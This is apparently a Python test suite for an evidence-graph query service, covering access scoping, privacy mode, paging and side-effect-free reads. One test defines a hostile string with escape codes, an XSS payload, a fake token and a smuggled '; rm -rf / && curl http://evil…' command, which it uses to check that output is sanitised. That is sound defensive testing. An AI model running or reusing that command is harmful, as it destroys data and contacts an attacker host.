"""Evidence Graph query service: access rules, the bounded summary, side-effect-free reads (synthetic data only)."""
import json
import os
import socket
import unittest
from contextlib import ExitStack
from unittest import mock

from chitragupta import common, extract, graphstore as gs, graphviews as gv, profile, store
from tests import graphfixture as fx
from tests.test_graph_store import EXPORT, FILTER, STEPS, SyncBase, everything

A, B = "ABC-1001", "ABC-1002"


class ViewBase(SyncBase):
    def read(self, **args):
        return gv.read(dict({"view": "summary", "ticket": A}, **args))

    def second(self, failed=False):
        """A second workflow on the same ticket in the other repository; its ac1 run passes or fails."""
        rec = self.associate(self.workflow([FILTER, EXPORT], repo=self.repo_b, steps=STEPS, approve=True),
                             sid="sess-2", repo=self.repo_b)
        rec = self.observe(rec)
        self.captured_test(rec, "t3", status="failed" if failed else "passed")
        return self.map(rec, evidence="test:t3", criteria=["ac1"], coverage="complete")

    def by_text(self, out):
        return {r["text"]: r for r in out["rows"]}

    def without(self, location):
        """The profile stops including one repository (the read-time check; the index still holds its rows)."""
        real = profile.Policy.repo_in_scope
        gone = common.norm_path(location)

        def in_scope(pol, path):
            return real(pol, path) and common.norm_path(path) != gone
        return mock.patch.object(profile.Policy, "repo_in_scope", in_scope)


class Summary(ViewBase):
    def test_the_summary_of_a_built_ticket(self):
        self.sync()
        out = self.read()
        self.assertEqual((out["operation"], out["ticket"], out["graph"]["state"], out["graph"]["stale"]),
                         ("graph_summary", A, "ok", False))
        self.assertEqual(out["graph"]["snapshot"], 1)
        self.assertEqual(out["requirements"], {"total": 2, "current": 2, "unconfirmed": 0, "removed": 0, "excluded": 0})
        rows = self.by_text(out)
        self.assertEqual(sorted(rows), sorted([EXPORT, FILTER]))
        f = rows[FILTER]
        self.assertEqual((f["alias"], f["aliases"], f["statuses"]["combined"]["verification"]["state"]),
                         ("ac1", {self.rec["id"]: "ac1"}, "Verified within recorded scope"))
        self.assertEqual([s["workflow"] for s in f["statuses"]["scopes"]], [self.rec["id"]])
        self.assertEqual(f["compact"]["plan"], "Plan v1")
        self.assertTrue(f["compact"]["run"].startswith("passed; observed at "))
        self.assertEqual(rows[EXPORT]["statuses"]["combined"]["verification"]["state"], "Unverified")
        self.assertEqual(out["counts"]["verification"], {"Verified within recorded scope": 1, "Unverified": 1})
        self.assertEqual(out["snapshot"]["state"], "current")
        self.assertEqual(out["next_action"], "no linked implementation: ac1")   # no commit is mapped yet
        self.assertIsNone(out["next_cursor"])
        self.assertLessEqual(len(json.dumps(out).encode()), gv.cv.MAX_BYTES)
        self.assertEqual(self.read()["snapshot_id"], out["snapshot_id"])

    def test_inputs_moved_on_reads_as_behind(self):
        self.sync()
        self.put(A, title="changed")
        graph = self.read()["graph"]
        self.assertEqual((graph["state"], graph["stale"]), ("behind", True))

    def test_validation(self):
        for bad in ({"view": "save"}, {"ticket": "abc-1"}, {"ticket": A, "extra": 1}, {"ticket": A, "requirement": "x;"},
                    {"ticket": A, "workflow": "w_../x"}, {"ticket": A, "since": -1}, {"ticket": A, "since": "1a"},
                    {"ticket": A, "basis": "guess"}, {"ticket": A, "history": "yes"}, {"ticket": A, "privacy": 1},
                    {"ticket": A, "cursor": "c" * 2000}, {"ticket": "A" * 9000}, "summary"):
            with self.subTest(bad=str(bad)[:50]):
                with self.assertRaises(ValueError):
                    gv.read(bad)

    def test_a_cursor_for_other_filters_asks_for_a_reload(self):
        self.sync()
        token = gv.cv.make_cursor("summary", gv._cursor_ref("summary", {"ticket": A}), 1, profile.signature(self.cfg), 1)
        self.assertEqual(self.read(cursor=token)["offset"], 1)
        with self.assertRaises(ValueError):
            self.read(cursor=token, history=True)


class Access(ViewBase):
    def test_out_of_scope_ticket_and_changed_profile_return_nothing(self):   # EG-A18 part
        self.sync()
        os.remove(store.ticket_path(B))
        with self.assertRaises(PermissionError):
            self.read(ticket=B)
        cfg = json.loads(json.dumps(self.cfg))
        cfg["profile"]["include_tickets"]["ABC-1003"] = "Third task"
        fx_write_config(cfg)   # the profile signature changes; the index is on the old one until the next sync
        out = self.read()
        self.assertEqual(out["graph"]["state"], "rebuilding")
        for key in ("rows", "requirements", "counts", "next_action"):
            self.assertNotIn(key, out)
        self.assertNotIn(FILTER, json.dumps(out))

    def test_not_built_yet(self):
        out = self.read()
        self.assertEqual(out["graph"]["state"], "not_built")
        self.assertNotIn("rows", out)

    def test_partial_revocation(self):
        other = self.second(failed=True)
        self.sync()
        both = self.read()
        f = self.by_text(both)[FILTER]
        self.assertEqual(f["statuses"]["combined"]["verification"]["state"], "Failed")   # the hidden one decides
        self.assertIn("failed verification", both["next_action"])
        with self.without(self.repo_b):
            out = self.read()
        text = json.dumps(out)
        self.assertNotIn(other["id"], text)   # nodes, edges, aliases, scopes, reasons: nothing names it
        f = self.by_text(out)[FILTER]
        self.assertEqual(f["aliases"], {self.rec["id"]: "ac1"})
        self.assertEqual([s["workflow"] for s in f["statuses"]["scopes"]], [self.rec["id"]])
        self.assertEqual(f["statuses"]["combined"]["verification"]["state"], "Verified within recorded scope")
        self.assertEqual(out["counts"]["verification"], {"Verified within recorded scope": 1, "Unverified": 1})
        self.assertNotIn("failed verification", out["next_action"])
        self.assertEqual(out["critical"], {"total": 0, "ids": []})
        self.assertEqual(out["source_coverage"]["workflows"], 1)
        with self.without(self.repo_b):
            scope = gv._scope(A, self.cfg)
        view = gv._filtered(scope["rows"], scope)
        self.assertFalse([n for n in view["nodes"].values() if n.get("workflow") == other["id"]])
        self.assertFalse([e for e in view["edges"] if e.get("workflow") == other["id"]])
        kept = set(view["nodes"])
        self.assertTrue(all(e["src"] in kept and e["dst"] in kept for e in view["edges"]))
        self.assertFalse([s for s in view["statuses"] if s.get("workflow") == other["id"]])

    def test_a_node_under_a_hidden_ticket_is_unreachable(self):
        fx.write_card(common.home(), B, ["An empty result shows a clear message"])
        shared = fx.commit_rec(1, "ABC-1001 ABC-1002 Shared change", repo="scratch", files=["src/orders/list.py"])
        self.put(B, commits={shared["sha"]: shared})
        self.sync()
        con = gs.open_write()
        try:
            hidden = [n for n in gs.ticket_rows(con, B)[0] if n["type"] == "requirement"]
        finally:
            con.close()
        self.assertTrue(hidden)
        os.remove(store.ticket_path(B))
        scope = gv._scope(A, self.cfg)
        view = gv._filtered(scope["rows"], scope)
        for node in hidden:
            with self.assertRaises(ValueError):
                gv.resolve_requirement(A, node["id"], None, view)
            self.assertNotIn(node["id"], json.dumps(self.read()))
        with self.assertRaises(PermissionError):
            self.read(ticket=B)

    def test_an_alias_in_two_workflows_is_refused_with_choices(self):
        other = self.second()
        self.sync()
        scope = gv._scope(A, self.cfg)
        view = gv._filtered(scope["rows"], scope)
        with self.assertRaises(ValueError) as caught:
            gv.resolve_requirement(A, "ac1", None, view)
        self.assertIn(self.rec["id"], str(caught.exception))
        self.assertIn(other["id"], str(caught.exception))
        rid = gv.resolve_requirement(A, "ac1", self.rec["id"], view)
        self.assertEqual(gv.resolve_requirement(A, "ac1", other["id"], view), rid)   # the same Jira requirement
        self.assertEqual(gv.resolve_requirement(A, rid, None, view), rid)
        self.assertEqual(gv.resolve_requirement(A, "R1", None, view), rid)
        with self.assertRaises(ValueError):
            gv.resolve_requirement(A, "ac9", None, view)

    def test_privacy_mode_hides_text(self):
        self.sync()
        out = self.read(privacy=True)
        text = json.dumps(out)
        for secret in (FILTER, EXPORT, "Add the order filter", "ABC-1001 Add the order filter"):
            self.assertNotIn(secret, text)
        self.assertEqual({r["text"] for r in out["rows"]}, {gv.HIDDEN})
        self.assertTrue(out["privacy"])
        self.assertIn(FILTER, json.dumps(self.read(privacy=False)))


class Bounds(ViewBase):
    def test_120_requirements_page_within_bounds(self):
        # short wording: the card extractor reads the description up to 3,000 characters
        texts = [FILTER, EXPORT] + ["Shop rule %d holds" % i for i in range(3, 121)]
        fx.write_card(common.home(), A, texts)
        self.sync()
        out, seen, pages = self.read(), [], 0
        while True:
            pages += 1
            self.assertLessEqual(len(json.dumps(out).encode()), gv.cv.MAX_BYTES)
            self.assertEqual((out["total"], out["requirements"]["total"]), (120, 120))
            self.assertLessEqual(len(out["rows"]), gv.PAGE_SIZE)
            seen += [r["id"] for r in out["rows"]]
            if not out["next_cursor"]:
                break
            out = self.read(cursor=out["next_cursor"])
        self.assertEqual((len(seen), len(set(seen)), pages), (120, 120, 3))
        self.assertEqual(sum(out["counts"]["plan_coverage"].values()), 120)


class SideEffects(ViewBase):
    def test_reads_change_nothing_and_call_nothing(self):   # EG-A21 part
        self.second()
        self.sync()
        gs.reset()
        before = everything(common.home())
        calls = []

        def trip(name):
            def fail(*a, **k):
                calls.append(name)
                raise AssertionError("read performed " + name)
            return fail
        with ExitStack() as stack:
            stack.enter_context(mock.patch.object(extract, "call_claude", trip("model call")))
            stack.enter_context(mock.patch.object(socket.socket, "connect", trip("network connection")))
            stack.enter_context(mock.patch.object(socket, "create_connection", trip("network connection")))
            stack.enter_context(mock.patch.object(common, "write_json", trip("data-home write")))
            for _ in range(5):
                self.read()
                self.read(privacy=True)
                self.read(view="trace", requirement="ac1", workflow=self.rec["id"], history=True)
                self.read(view="changes")
                gv.render_text(self.read(view="changes", since=0))
                with self.without(self.repo_b):
                    self.read()
                    self.read(view="trace", requirement="R1")
        self.assertEqual(calls, [])
        self.assertEqual(self.processes, [])
        gs.reset()
        self.assertEqual(everything(common.home()), before)


FILTER2 = "Orders can be filtered by status and by date"
FAKE_TOKEN = "gh" + "p_" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ab"   # assembled here so no token-shaped literal is committed
EVIL = ("Bad \x1b[31m\x07 <script>alert(1)</script> [x](javascript:alert(1)) file:///etc/passwd "
        + FAKE_TOKEN + "; rm -rf / && curl http://evil.acme.test/x")


class Trace(ViewBase):
    def edges_are_inside(self, out, view):
        """Every reaching edge is a visible edge whose two endpoints are visible nodes."""
        edges = {e["id"]: e for e in view["edges"]}
        for item in out["items"]:
            self.assertIn(item["node"]["id"], view["nodes"])
            if item["edge"]:
                edge = edges[item["edge"]["id"]]
                self.assertTrue(edge["src"] in view["nodes"] and edge["dst"] in view["nodes"])
                self.assertEqual(edge["dst"], item["node"]["id"])

    def test_layers_in_order_with_their_edges(self):
        self.rec = self.map(self.rec, evidence="commit:" + fx.sha(1), criteria=["ac1"])
        self.sync()
        out = self.read(view="trace", requirement="ac1")
        self.assertEqual((out["operation"], out["requirement"]["alias"], out["requirement"]["text"]),
                         ("graph_trace", "ac1", FILTER))
        layers = [i["layer"] for i in out["items"]]
        order = list(gv.LAYERS) + ["ticket evidence"]
        self.assertEqual(layers, sorted(layers, key=order.index))
        by_layer = {}
        for item in out["items"]:
            by_layer.setdefault(item["layer"], []).append(item)
        self.assertTrue(by_layer["plan steps"] and by_layer["commits"] and by_layer["tests and runs"])
        commit = by_layer["commits"][0]
        self.assertEqual((commit["edge"]["type"], commit["edge"]["basis"]), ("IMPLEMENTED_BY", "declared"))
        self.assertTrue(commit["edge"]["declarations"])
        run = [i for i in by_layer["tests and runs"] if i["edge"]["type"] == "SUPPORTED_BY"][0]
        self.assertEqual(run["edge"]["applicability"], "current")
        self.assertEqual(out["totals"]["commits"], len(by_layer["commits"]))
        self.assertEqual(sum(out["totals"].values()), out["total"])
        scope = gv._scope(A, self.cfg)
        self.edges_are_inside(out, gv._filtered(scope["rows"], scope))
        declared = self.read(view="trace", requirement="ac1", basis="observed")
        self.assertFalse([i for i in declared["items"] if i["edge"] and i["edge"]["type"] in gv.LINKS])

    def test_a_trace_never_reaches_a_filtered_endpoint(self):
        other = self.second()
        self.rec = self.map(self.rec, evidence="commit:" + fx.sha(1), criteria=["ac1"])
        self.sync()
        with self.without(self.repo_b):
            out = self.read(view="trace", requirement="ac1")
            scope = gv._scope(A, self.cfg)
            view = gv._filtered(scope["rows"], scope)
        self.assertNotIn(other["id"], json.dumps(out))
        self.edges_are_inside(out, view)
        full = self.read(view="trace", requirement="ac1", workflow=other["id"])
        self.assertIn(other["id"], json.dumps(full))

    def test_history_shows_earlier_wording(self):
        self.sync()
        fx.write_card(common.home(), A, [FILTER2, EXPORT])
        self.sync()
        now = self.read(view="trace", requirement="R1")
        self.assertEqual([r["text"] for r in now["requirement"]["revisions"]], [FILTER2])
        old = self.read(view="trace", requirement="R1", history=True)
        self.assertEqual(sorted(r["text"] for r in old["requirement"]["revisions"]), sorted([FILTER, FILTER2]))
        self.assertEqual(len(old["requirement"]["supersedes"]), 1)
        self.assertEqual([o["event"] for o in old["requirement"]["occurrences"]], ["added", "modified"])

    def test_a_requirement_is_required_and_must_be_visible(self):
        self.sync()
        with self.assertRaises(ValueError):
            self.read(view="trace")
        with self.assertRaises(ValueError):
            self.read(view="trace", requirement="ac9")
        with self.assertRaises(ValueError):
            self.read(view="trace", requirement="gr_" + "0" * 24)

    def test_an_old_cursor_asks_for_a_reload(self):
        self.sync()
        gen = profile.signature(self.cfg)
        ref = gv._cursor_ref("trace", {"ticket": A, "requirement": "ac1"})
        token = gv.cv.make_cursor("trace", ref, 1, gen, 1)
        self.assertEqual(self.read(view="trace", requirement="ac1", cursor=token)["offset"], 1)
        for changed in ({"basis": "declared"}, {"history": True}, {"requirement": "R1"}, {"since": 1}):
            with self.subTest(changed=changed):
                with self.assertRaises(ValueError):
                    self.read(**dict({"view": "trace", "requirement": "ac1", "cursor": token}, **changed))
        with self.assertRaises(ValueError):   # another profile generation
            self.read(view="trace", requirement="ac1", cursor=gv.cv.make_cursor("trace", ref, 1, "other", 1))
        commits = dict(self.tk(A)["commits"])
        extra = fx.commit_rec(2, "ABC-1001 Second change", repo="scratch")
        commits[extra["sha"]] = extra
        self.put(A, commits=commits)
        self.sync()   # another snapshot
        with self.assertRaises(ValueError):
            self.read(view="trace", requirement="ac1", cursor=token)


class Changes(ViewBase):
    def add_commit(self, n, subject):
        commits = dict(self.tk(A)["commits"])
        extra = fx.commit_rec(n, subject, repo="scratch", files=["src/orders/c%d.py" % n])
        commits[extra["sha"]] = extra
        self.put(A, commits=commits)
        return extra

    def test_a_new_commit_is_new_implementation_evidence(self):
        self.sync()
        first = self.read(view="changes")
        self.assertEqual((first["baseline"], first["from"], first["to"], first["entries"]), ("ok", 0, 1, 1))
        extra = self.add_commit(2, "ABC-1001 Add the order export")
        self.sync()
        out = self.read(view="changes")
        self.assertEqual((out["baseline"], out["from"], out["to"], out["entries"]), ("ok", 1, 2, 1))
        impl = [i for i in out["items"] if i["category"] == "implementation"]
        self.assertEqual([i["label"] for i in impl if i["kind"] == "commit"], ["ABC-1001 Add the order export"])
        self.assertEqual(out["totals"]["implementation"], len(impl))
        self.assertEqual(self.read(view="changes", since=2)["entries"], 0)
        hidden = self.read(view="changes", privacy=True)
        self.assertNotIn("Add the order export", json.dumps(hidden))
        self.assertIn(extra["sha"][:9], json.dumps(hidden))
        self.assertIn("implementation: commit", gv.render_text(out))

    def test_status_transitions_and_gaps(self):
        self.sync()
        self.rec = self.map(self.rec, evidence="commit:" + fx.sha(1), criteria=["ac1"], steps=["one"])
        self.sync()
        out = self.read(view="changes")
        status = [i for i in out["items"] if i["category"] == "status" and i["kind"] == "implementation"]
        self.assertTrue(status)
        self.assertTrue(any(i["to"] == "Linked" for i in status))
        self.assertTrue([i for i in out["items"] if i["category"] == "gaps" and i["state"] == "closed"])

    def test_profile_change_makes_earlier_changes_unavailable(self):   # EG-A18 rest
        self.sync()
        self.add_commit(2, "ABC-1001 Add the order export")
        self.sync()
        cfg = json.loads(json.dumps(self.cfg))
        cfg["profile"]["include_tickets"]["ABC-1003"] = "Third task"
        fx_write_config(cfg)
        self.assertEqual(self.read(view="changes")["graph"]["state"], "rebuilding")
        gs.sync(cfg)
        for since in (None, 1, 0):
            with self.subTest(since=since):
                out = self.read(view="changes", **({} if since is None else {"since": since}))
                self.assertEqual(out["baseline"], "unavailable")
                self.assertIn("profile", out["reason"])
                self.assertEqual(out["items"], [])
                self.assertIn("counts", out["current"])   # the current authorized state, said plainly

    def test_unknown_dropped_and_reset_sequences(self):
        self.sync()
        out = self.read(view="changes", since=99)
        self.assertEqual((out["baseline"], out["reason"]), ("unavailable", "unknown sequence"))
        journal = [{"seq": 5, "prev": None, "baseline": "reset", "delta": {}}, {"seq": 6, "prev": 5, "delta": {}}]
        self.assertEqual(gv._since(journal, 2), (None, "dropped by retention"))
        self.assertEqual(gv._since(journal, 0), (None, "dropped by retention"))
        self.assertEqual(gv._since(journal, None), (5, None))
        self.assertEqual(gv._since(journal[:1], None), (None, "reset by recovery"))

    def test_a_200_entry_journal_folds_within_bounds(self):
        self.sync()
        path = gs.history_path(A)
        data = gs.load_history(A)[1]
        head = data["journal"][0]
        first = sum(1 for row in head["delta"]["evidence"]["added"] if row[1] in ("commit", "code_change"))
        for seq in range(2, 201):
            data["journal"].append({"seq": seq, "prev": seq - 1, "at": head["at"], "content": head["content"],
                                    "profile_generation": head["profile_generation"],
                                    "delta": {"requirements": {}, "source": None, "more": 0, "status": [],
                                              "evidence": {"added": [["gm_%024x" % seq, "commit", "", ""]],
                                                           "removed": [], "changed": []}}})
        data["head"] = dict(data["head"], seq=200)
        data["next_seq"] = 201
        common.write_json(path, data)
        out, seen = self.read(view="changes", since=0), []
        self.assertEqual((out["entries"], out["from"], out["to"]), (200, 0, 200))
        self.assertEqual(out["totals"]["implementation"], 199 + first)
        while True:
            self.assertLessEqual(len(json.dumps(out).encode()), gv.cv.MAX_BYTES)
            self.assertLessEqual(len(out["items"]), gv.PAGE_SIZE)
            seen += [(i["category"], i.get("id"), i.get("kind"), i["seq"]) for i in out["items"]]
            if not out["next_cursor"]:
                break
            out = self.read(view="changes", since=0, cursor=out["next_cursor"])
        self.assertEqual(len(seen), out["total"])
        self.assertEqual(len(set(seen)), out["total"])
        self.assertEqual(seen[0][3], 200)   # newest first


class Untrusted(ViewBase):
    def test_hostile_text_is_inert_everywhere(self):   # EG-A19
        fx.write_card(common.home(), A, [FILTER, EXPORT, EVIL])
        commits = {c["sha"]: c for c in [fx.commit_rec(1, "ABC-1001 " + EVIL, repo="scratch", files=["src/orders/list.py"])]}
        pr = dict(fx.pull_request(7, head=fx.sha(1)), title=EVIL)
        self.put(A, commits=commits, git={"repos": {"scratch": {"prs": [pr], "branches": [], "rows": []}}})
        self.sync()
        outs = [self.read(), self.read(view="trace", requirement="R3", history=True),
                self.read(view="trace", requirement="ac1"), self.read(view="changes", since=0)]
        texts = [json.dumps(o) for o in outs] + [gv.render_text(o) for o in outs]
        found = "".join(texts)
        self.assertIn("rm -rf", found)   # the text is there, as plain text
        for bad in ("\x1b", "\x07", "\\u001b", "\\u0007", "javascript:", "file://", "http://evil", FAKE_TOKEN[:4],
                    FAKE_TOKEN[4:]):
            with self.subTest(bad=bad):
                self.assertNotIn(bad, found)
        trace = outs[1]
        self.assertIn("[link]", trace["requirement"]["text"])
        labels = [i["node"]["label"] for i in outs[2]["items"] if i["node"]["type"] in ("commit", "pull_request")]
        self.assertTrue(labels and all("[link]" in label or "[GITHUB-TOKEN]" in label for label in labels))


def fx_write_config(cfg):
    from tests.support import write_config
    write_config(common.home(), cfg)


if __name__ == "__main__":
    unittest.main()
